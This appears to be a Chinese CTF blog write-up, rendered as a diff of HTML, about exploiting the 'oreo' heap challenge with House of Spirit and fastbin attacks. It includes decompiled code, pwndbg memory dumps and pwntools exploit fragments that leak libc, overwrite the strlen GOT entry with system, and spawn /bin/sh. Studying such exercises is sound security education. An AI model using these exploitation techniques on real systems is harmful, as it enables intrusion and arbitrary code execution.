+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = heap_bss;</span><br><span class="line">  heap_bss = <span class="built_in">malloc</span>(<span class="number">0x38</span>u);                     <span class="comment">// 每次分配的时候，都会更新</span></span><br><span class="line">  <span class="keyword">if</span> ( heap_bss )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;heap_bss-&gt;field_20 + <span class="number">2</span>) = v1;            <span class="comment">// 在每个堆的末尾，写上一个堆的地址，并非13而是0x34，看汇编</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle name: &quot;</span>);</span><br><span class="line">    fgets(&amp;heap_bss-&gt;field_7, <span class="number">56</span>, <span class="built_in">stdin</span>);       <span class="comment">// 会在结尾加上&#x27;\0&#x27;</span></span><br><span class="line">    vul(&amp;heap_bss-&gt;field_7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle description: &quot;</span>);</span><br><span class="line">    fgets(&amp;heap_bss-&gt;des.des, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    vul(&amp;heap_bss-&gt;des.des);</span><br><span class="line">    ++add_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something terrible happened!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>这里没啥说的，就是遍历</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Rifle to be ordered:\n%s\n&quot;</span>, <span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = heap_bss; i; i = *(&amp;i-&gt;field_20 + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, &amp;i-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>一个依次释放块的过程，利用每个块结尾所保存的指针。这里主要如果把该指针覆盖为0的话，则遍历提前结束。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *ptr; <span class="comment">// ST18_4</span></span><br><span class="line">  rifle *v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = heap_bss;</span><br><span class="line">  <span class="keyword">if</span> ( add_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = v2;</span><br><span class="line">      v2 = *(&amp;v2-&gt;field_20 + <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    heap_bss = <span class="number">0</span>;</span><br><span class="line">    ++order_num;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Okay order submitted!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No rifles to be ordered!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="leave-message"><a href="#leave-message" class="headerlink" title="leave_message"></a>leave_message</h4><p>这里有任意写的一个机会。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">leave_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);</span><br><span class="line">  fgets(message, <span class="number">128</span>, <span class="built_in">stdin</span>);                   <span class="comment">// message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。</span></span><br><span class="line">  vul(message);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还一个函数没啥用，不多说了。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这里我不想太可以去说是利用了些什么方式来拿shell（<del>因为我说不清楚</del>），直接看思路吧。</p>
+<blockquote>
+<p>step1：通过show函数来泄露出Libc基址。</p>
+<p>step2：通过add函数在bss上构造出一个fake_chunk。</p>
+<p>step3：通过leave_message函数和add函数中野联动来达到任意地址写效果。这里是把strlen改写为system</p>
+<p>step4：通过leave_message函数来实现system(system;&#x2F;bin&#x2F;sh)&#x3D;system(system) + system(&#x2F;bin&#x2F;sh)成功get_shell。</p>
+</blockquote>
+<h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>注意一个小细节，为什么是接受两次<code>Description: </code>，在程序添加第一个chunk后，因为前面没有其他的chunk了，所以<code>data+0x34</code>处的地址是<code>\x00</code>，我们把这里覆盖为<code>puts.got</code>的地址就会造成前面还有chunk的假象，第二次输出的前4位（32位程序）正是puts的真实地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="number">27</span> * <span class="string">&#x27;a&#x27;</span> + p32(oreo.got[<span class="string">&#x27;puts&#x27;</span>]) </span><br><span class="line">add(<span class="number">20</span> * <span class="string">&#x27;a&#x27;</span>, name)</span><br><span class="line">show_rifle()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>注意看下面的几个变量，其相差均为<code>0x4</code>，如果可以控制对应的数据，那么就可以在bss上伪造出一个chunk，再利用上一步用到的覆盖chunk末尾的指针，则可以实现在bss上malloc</p>
+<p>具体实现就是，add_num会记录程序add的chunk块，我们add个0x40此就可以把add_num作为chunk的size了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A2A0 order_num       dd ?                    ; DATA XREF: delete+5A↑r</span><br><span class="line">.bss:0804A2A0                                         ; delete+62↑w ...</span><br><span class="line">.bss:0804A2A4 add_num         dd ?                    ; DATA XREF: add+C5↑r</span><br><span class="line">.bss:0804A2A4                                         ; add+CD↑w ...</span><br><span class="line">.bss:0804A2A8 ; char *message</span><br><span class="line">.bss:0804A2A8 message         dd ?                    ; DATA XREF: leave_message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; leave_message+3C↑r ...</span><br><span class="line">.bss:0804A2AC                 align 20h</span><br><span class="line">.bss:0804A2C0 unk_804A2C0     db    ? ;               ; DATA XREF: main+29↑o</span><br><span class="line">.bss:0804A2C1                 db    ? ;</span><br><span class="line">.bss:0804A2C2                 db    ? ;</span><br><span class="line">.bss:0804A2C3                 db    ? ;</span><br><span class="line">.bss:0804A2C4                 db    ? ;</span><br><span class="line">.bss:0804A2C5                 db    ? ;</span><br><span class="line">.bss:0804A2C6                 db    ? ;</span><br><span class="line">.bss:0804A2C7                 db    ? ;</span><br><span class="line">.bss:0804A2C8                 db    ? ;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">oifle = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> oifle &lt; <span class="number">0x3f</span>:</span><br><span class="line">        <span class="comment"># set next link=NULL</span></span><br><span class="line">        add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0</span>))</span><br><span class="line">        oifle += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>这里我觉得算是整个程序我最难理解的一部分吧</p>
+<p>上面说到为了使add_num达到0x40要add</p>
+<p>这里首先使构造这0x40个chunk的最后一个chunk</p>
+<p><strong>把chunk的指针（data+0x34）指到bss段上</strong>，这里是0x804a2a8</p>
+<p>然后leave_message留言使data+0x34的部分为”\x00“，这里就是让我裂开的地方，我觉得覆盖到0xe0前面就行了，但事实是，不行。</p>
+<p>这里是真的把我给看傻了，ctf-wiki在该fake_chunk后又构造了一个chunk，我不知道目的是什么，经过测试不构造这个也可以，但是必须要填充至少0x25个数据上去。为什么呢，为什么呢，为什么呢，我他妈裂开。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40wx 0x0804A2A0</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000000	0x00000a61	0x00000000	0x00000000</span><br><span class="line">0x804a2f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<p>然后就是order来ferr掉我们伪造的chunk，这样下次分配的时候就会分配到我们伪造的这个chunk上。</p>
+<p><strong>分配的时候把0x804a2a8的位置重写为strlen函数的got表位置</strong>，再次leave_message的时候，会直接通过0x804a2a8跳转到strlen.got上，这样就达到了修改got表的目的。</p>
+<p>为什么是strlen这个函数呢，因为在leave_message完之后（其实add中两次fgets也一样），会调用vul()函数来对输入进行一个判断，其中会有strlen()函数。其中strlen函数的参数在这里是bss上message的地址，而该地址的值又是另一个地址，如果最终的值是“\bin\sh”，在strlen被改为system的情况下，<strong>最终效果就是通过strlen(bss_heap)来实现system(“&#x2F;bin&#x2F;sh”)的效果</strong>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">leave_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);</span><br><span class="line">  fgets(message, <span class="number">128</span>, <span class="built_in">stdin</span>);                   <span class="comment">// message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。</span></span><br><span class="line">  vul(message);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">vul</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *heap_25)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(heap_25) - <span class="number">1</span>;   <span class="comment">//就是利用这一行来实现get_shell，我这里修改结构体没改好有点难看。</span></span><br><span class="line">  v3 = &amp;heap_25[v1];</span><br><span class="line">  <span class="keyword">if</span> ( &amp;heap_25[v1] &gt;= heap_25 &amp;&amp; *v3 == <span class="number">10</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">   <span class="comment"># set next link=0x0804A2A8, try to free a fake chunk</span></span><br><span class="line">   add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, payload)</span><br><span class="line">   <span class="comment"># before free, we need to bypass some check</span></span><br><span class="line">   <span class="comment"># fake chunk&#x27;s size is 0x40</span></span><br><span class="line">   <span class="comment"># 0x20 *&#x27;a&#x27; for padding the last fake chunk</span></span><br><span class="line">   <span class="comment"># 0x40 for fake chunk&#x27;s next chunk&#x27;s prev_size</span></span><br><span class="line">   <span class="comment"># 0x100 for fake chunk&#x27;s next chunk&#x27;s size</span></span><br><span class="line">   <span class="comment"># set fake iofle&#x27; next to be NULL</span></span><br><span class="line">   payload = <span class="number">0x24</span> * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>  </span><br><span class="line">   <span class="comment">#+ p32(0x60)</span></span><br><span class="line">   <span class="comment">#payload = payload.ljust(52, &#x27;b&#x27;)</span></span><br><span class="line">   <span class="comment">#payload += p32(0)</span></span><br><span class="line">   <span class="comment">#payload = payload.ljust(128, &#x27;c&#x27;)</span></span><br><span class="line">   message(payload)</span><br><span class="line">   <span class="comment"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span></span><br><span class="line">   <span class="comment">#gdb.attach(p)</span></span><br><span class="line">   <span class="comment">#p.interactive()</span></span><br><span class="line">   order()</span><br><span class="line">payload = p32(oreo.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">   add(payload, <span class="string">&#x27;b&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>这里是一个小细节，因为strlen的参数bss_heap也指向了strlen的got表。</p>
+<p>但是注意<code>;</code>可以分割命令，所以<code>system(&quot;system;/bin/sh&quot;) = system(&quot;system&quot;) + system(&quot;/bin/sh&quot;)</code></p>
+<p>system(“system”)不能正确执行，所以最后只剩system(“&#x2F;bin&#x2F;sh”)了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message(p32(system_addr) + <span class="string">&#x27;;/bin/sh\x00&#x27;</span>)    </span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#fastbin-attack">Fastbin Attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoi123/article/details/81482385">House of Spirit学习调试验证与实践</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/59477082">linux 堆溢出学习之house of spirit(1) malloc maleficarum hos翻译</a></p>
+<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>怎么说呢，被一道并不算难，甚至可以说是简单？的题目卡了两三天还是挺让人沮丧的，眼看上海赛已经迫在眉睫了自己进展却是如此缓慢。做逆向的时候学如嚼蜡进度如乌龟爬，被pwn所吸引之后却又感觉时间是如此的不够用，如果……</p>
+<p>没有什么如果啦，归根结底还是自己太懒了不够努力</p>
+<p>2020马上就要结束了，这并不是很美好的一年，疫情，山火、蝗灾、川皇落选……一切都让2020充满了魔幻色彩。临近的尾声的2020也不让人消停，岁末赛出题加上猝不及防的上海赛都让我倍感压力，但看看周围其他同学，谁又不是顶着压力前行呢，保研的希望稳住最后的考试，实习的忙着准备面试，打学科竞赛的更是夜以继日的学，大伙都在努力冲冲冲呢。</p>
+<p>未哭过长夜者，不足以语人生，希望在走过这些无人问津的孤独旅程后，我们都能迎来一个更好的2021年，以及之后的每一年！( ｀・∀・´)ﾉﾖﾛｼｸ</p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2020/11/01/pwn_fastbin-attack/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-27T21:11:38+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 27, 2024</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_overlap/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
+          
   
   
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pwn/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>pwn</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/heap/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>heap</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/House-Of-Spirit/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>House Of Spirit</p></a></div>
+  <span hidden itemprop="keywords">pwn heap House Of Spirit</span>
+  
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2022/07/02/atest/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>test--</p>
+          <p class='content'>测试博客是否还活着
+
+
+test
+11
+</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/10/27/pwn_overlap/'>
+          <p class='title'>water one water<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Chunk_extend &amp; Overlap
+
+
+Intorductionchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapp...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2020/11/01/pwn_fastbin-attack/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_overlap/"  itemprop="url">
-        water one water
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>Chunk_extend &amp; Overlap</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_overlap/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_uaf/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
